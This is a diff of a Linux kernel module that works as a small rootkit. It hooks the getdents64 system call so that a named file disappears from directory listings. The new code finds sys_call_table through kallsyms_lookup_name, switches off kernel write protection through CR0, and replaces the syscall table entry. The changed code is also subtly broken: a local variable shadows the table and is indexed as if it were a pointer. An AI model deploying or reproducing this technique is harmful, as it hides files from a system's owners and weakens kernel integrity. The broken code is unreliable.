@@ -7,13 +7,11 @@
 #include <linux/dirent.h>
 #include <asm/cacheflush.h>
 
-// static unsigned long *syscall_table = (unsigned long *)0xffffffff81e002a0;
-// syscall_table[__NR_getdents] = hooked_getdents;
 MODULE_AUTHOR("0xe7, 0x1e");
 MODULE_DESCRIPTION("Hide a file from getdents syscalls");
 MODULE_LICENSE("GPL");
 
-void **sys_call_table;
+unsigned long table;
 
 #define FILE_NAME "thisisatestfile.txt"
 
@@ -35,45 +33,24 @@ asmlinkage int sys_getdents64_hook(unsigned int fd, struct linux_dirent64 *dirp,
                         continue;
                 }
                 i += cur->d_reclen;
-                cur = (struct linux_dirent*) ((char*)dirp + i);
+                cur = (struct linux_dirent64*) ((char*)dirp + i);
         }
         return rtn;
 }
 
-int set_page_rw(unsigned long addr)
-{
-    // unsigned int level;
-    // pte_t *pte = lookup_address(addr, &level);
-    // if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
-    write_cr0(read_cr0() & (~ 0x10000));
-    return 0;
-}
-
-int set_page_ro(unsigned long addr)
-{
-    // unsigned int level;
-    // pte_t *pte = lookup_address(addr, &level);
-    // pte->pte = pte->pte &~_PAGE_RW;
-    write_cr0(read_cr0() | 0x10000); //Restore write protection
-    return 0;
-}
-
 static int __init getdents_hook_init(void)
-{
-
-    sys_call_table = (void*)0xffffffff81e002a0;
-    original_getdents64 = sys_call_table[__NR_getdents64];
-
-    set_page_rw(sys_call_table);
-    sys_call_table[__NR_getdents64] = sys_getdents64_hook;
-        return 0;
+{    
+    unsigned long table = (unsigned long *) kallsyms_lookup_name("sys_call_table"); //Lookup table entry point
+    write_cr0(read_cr0() & (~ 0x10000)); //Enable write access
+    original_getdents64 = (void*)table[__NR_getdents64];
+    table[__NR_getdents64] = (unsigned long) sys_getdents64_hook;
+    return 0;
 }
 
 static void __exit getdents_hook_exit(void)
 {
-    sys_call_table[__NR_getdents64] = original_getdents64;
-    set_page_ro(sys_call_table);
-        return 0;
+    table[__NR_getdents64] = original_getdents64;
+    write_cr0(read_cr0() | 0x10000); //Restore write protection
 }
 
 module_init(getdents_hook_init);
